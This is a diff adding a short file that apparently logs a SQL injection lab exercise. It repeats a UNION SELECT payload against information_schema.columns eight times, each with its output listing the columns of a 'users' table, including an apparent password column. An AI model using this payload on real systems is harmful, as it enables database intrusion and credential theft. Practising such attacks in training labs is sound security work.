@@ -1,0 +1,31 @@
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : user_id
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : first_name
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : last_name
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : town
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : country
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : planet
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : Commentaire
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : countersign
